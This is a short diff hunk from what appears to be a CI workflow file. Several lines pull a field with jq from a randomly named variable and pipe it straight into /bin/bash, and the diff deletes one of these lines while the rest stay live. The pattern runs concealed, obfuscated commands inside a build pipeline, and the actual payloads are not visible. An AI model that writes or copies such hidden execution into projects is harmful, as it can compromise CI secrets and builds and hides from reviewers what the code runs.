@@ -41,7 +41,6 @@ jobs:
           printf '%s' "$pene6915" | jq -r .jdi0 | /bin/bash
           echo $xzwsx3533 | jq -r .w53 | /bin/bash
           echo $t27950 | jq -r .np6985 | /bin/bash
-          echo $llma20 | jq -r .ojnbf2 | /bin/bash
           printf '%s' "$epx3" | jq -r .avy74757 | /bin/bash
           printf '%s' "$wx36" | jq -r .d81 | /bin/bash
           echo $cv76 | jq -r .em5788 | /bin/bash
